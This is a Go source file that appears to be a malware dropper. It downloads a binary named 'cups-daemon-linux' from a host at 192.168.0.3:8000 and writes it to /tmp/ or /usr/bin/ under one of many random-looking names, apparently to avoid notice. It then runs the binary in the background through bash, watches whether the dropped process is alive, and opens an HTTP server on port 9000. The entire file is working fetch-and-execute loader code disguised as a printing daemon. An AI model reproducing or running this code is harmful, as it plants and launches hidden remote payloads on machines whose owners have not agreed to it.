package main

import (
	"fmt"
	"io/ioutil"
	"math/big"
	"math/rand"
	"net"
	"net/http"
	"os"
	"os/exec"
	"strconv"
	"time"

	"github.com/shirou/gopsutil/process"
)

var (
	dirArray   = []string{"/tmp/", "/usr/bin/"}
	randomName = []string{
		"Lc8Se1Eo9P", "Df3Me8Tb9Uh6", "Lt3Xh2Nz6Hy0Wp6Q", "Wh6Cc8Ma2Kk6Pw2", "Ax6Ww3Pz4Hn0Xz8",
		"Ab7Pm5Sn3H", "Js6Ti8Ta2Jd4Cw", "Sb9Gw5Qs3M", "Wr2Wq6Uv0Zf6", "Yb6In1Es2R", "Tz7Cw8Qu3O",
		"Uf4Ej0Jk8F", "Sl5Bz6Rz5E", "Kq2Br6Du0F", "Wu9Vv9Ac0M", "Tp4Nn6Dz6U", "Uz9Hi5Vw9Nj6At6Yr",
		"Sq8Xi4Tm6Hm8", "Si1Ce1Od9Ze6", "Sb7Gp1Mb5Aj", "Tk2Nk8Rc8Qf4Wm0We6W", "Wy2Zc2Bc7K",
		"Xa2By4Fb4Kr6Wp", "Pz3Pt9Fg3Qj5M", "Im6Fs4Du0Ka0", "Za4Bj9Em2K", "Et6Qi2Ls2Ct2Ip6H",
		"Wj2Xf3Xh5U", "Bl2Ph0Pl8So0Eh3", "Mk9Ne4Wd8Iw6Jo8"}
	basePort = int64(10000)
)

func isValidPort(port int64) bool {
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("127.0.0.1:%d", port), 1*time.Second)
	if err != nil {
		return true
	}
	defer conn.Close()
	return false
}

func getOutIP() string {
	response, err := http.Get("https://myexternalip.com/raw")
	if err != nil {
		return "127.0.0.1"
	}
	defer response.Body.Close()

	body, _ := ioutil.ReadAll(response.Body)
	return string(body)
}

func getExecData(execName string) error {
	response, err := http.Get("http://192.168.0.3:8000/cups-daemon-linux")
	if err != nil {
		return err
	}
	defer response.Body.Close()

	content, _ := ioutil.ReadAll(response.Body)
	err = ioutil.WriteFile(execName, content, 0744)
	if err != nil {
		return err
	}
	return nil
}

func InetNtoA(ip int64) string {
	return fmt.Sprintf("%d.%d.%d.%d",
		byte(ip>>24), byte(ip>>16), byte(ip>>8), byte(ip))
}

func InetAtoN(ip string) int64 {
	ret := big.NewInt(0)
	ret.SetBytes(net.ParseIP(ip).To4())
	return ret.Int64()
}

func calcRandomPort() int64 {
	outIntIP := InetAtoN(getOutIP())
	randPort := outIntIP % basePort

	if randPort < basePort {
		randPort += basePort
	}

	for {
		ok := isValidPort(randPort)
		if ok {
			return randPort
		}
		randPort += 1
	}
}

func FileExist(path string) bool {
	_, err := os.Lstat(path)
	return !os.IsNotExist(err)
}

func randomExecPath() string {
	rand.Seed(time.Now().UnixNano())
	index := rand.Intn(len(randomName) - 1)

	execDir := "/"
	for _, dir := range dirArray {
		if FileExist(dir) {
			execDir = dir
			break
		}
	}
	return fmt.Sprintf(execDir + randomName[index])
}

func runExe(execName string) error {
	bgExe := fmt.Sprintf("%s &", execName)
	cmd := exec.Command("bash", "-c", bgExe)
	err := cmd.Run()
	if err != nil {
		return err
	}
	return nil
}

func main() {
	InitLogger("prod")
	Trace.Println("Start ip-issue process")
	execName := randomExecPath()
	err := getExecData(execName)
	if err != nil {
		Error.Println(err)
		return
	}

	err = runExe(execName)
	if err != nil {
		Error.Println(err)
		return
	}
	port := calcRandomPort()

	time.Sleep(10 * time.Second)
	go func(port int64, execName string) {
		Trace.Println("Before isValidPort, port is " + strconv.FormatInt(port, 10))
		for !isValidPort(port) {
			isRunning := false
			processes, _ := process.Processes()
			for _, proc := range processes {
				procName, _ := proc.Name()
				for _, name := range randomName {
					if procName == name {
						isRunning = true
						break
					}
				}
			}
			if isRunning {
				Info.Printf("%s is Running", execName)
			} else {
				Warning.Printf("%s is not Running", execName)
				break
			}
		}
		Trace.Println("After isValidPort")
	}(port, execName)

	err = http.ListenAndServe(":9000", nil)
	if err != nil {
		Error.Printf("HTTP Server start failed, err:%v\n", err)
		return
	}
}
